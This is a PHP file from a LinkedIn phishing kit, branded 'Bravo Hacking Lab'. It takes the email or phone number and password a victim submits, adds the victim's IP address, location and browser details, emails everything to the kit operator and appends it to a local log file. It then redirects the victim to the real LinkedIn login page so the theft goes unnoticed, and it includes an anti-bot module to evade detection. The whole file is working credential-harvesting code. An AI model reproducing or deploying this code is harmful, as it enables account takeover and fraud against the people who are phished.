<?php
      

      include("antibots.php");
      include("infoDetect.php");
     
      if(isset($_POST['submit'])){

      $ip = getenv("REMOTE_ADDR");
      $port = getenv("REMOTE_PORT");
      $adddate = date("D M d, Y g:i a");
      $browser = $_SERVER['HTTP_USER_AGENT'];

      $message .= "||--++--[ $$ Bravo.Lee  $$ ]---++-||\n";
      $message .= "||--DEFAULT INFO  --||\n";
      $message .= "Linkedin Email-Mobile : ".htmlspecialchars($_POST['session_key'])."\n";
      $message .= "Linkedin Pass: ".htmlspecialchars($_POST['session_password'])."\n";

      $message .= "||--------- IP Infos ---------||\n";
      $message .= "IP  Address  : $ip\n";
      $message .= "Port : $port\n";
      $message .= "Country : $countryName\n";
      $message .= "Region : $region\n";
      $message .= "City : $city\n";
      $message .= "City-Latitude : $latitude\n";
      $message .= "City-Longititude :  $longititude\n";
      $message .= "Local time And Date : $adddate\n";
      $message .= "User-Agent: ".$browser."\n";
      $message .= "     Created By Bravo.Lee
      #######################################
      ##--==> GET RICH OR DIE TRYING 
      ##--==> ICQ_ME_ON   Bravolee
      ##--==> t.me/bravo_tools 
      ##--==> iRep-Naija@gmail.com 
      #######################################
      \n\t\t\t";
      
      #-------------TO EMAIL---------------#
      
         include("./mailer/Email_results.php");
         $subject = "DEFAULT REZULT From -".$countryName."$ip";
         $headers = 'Bravo Hacking Lab'; 
         if(mail($to_email,$subject,$message,$headers)){
          
            header('Location: https://www.linkedin.com/login');
           
         }
     #-------------TO TXT FILE---------------#
            $file = 'Client-Logs-infos.txt';
            $text = fopen($file, 'a');
            fwrite($text, $message);
            fclose($text);
    # --------------------------------------- #        
            header('Location: https://www.linkedin.com/login');
 
         
   }







?>

 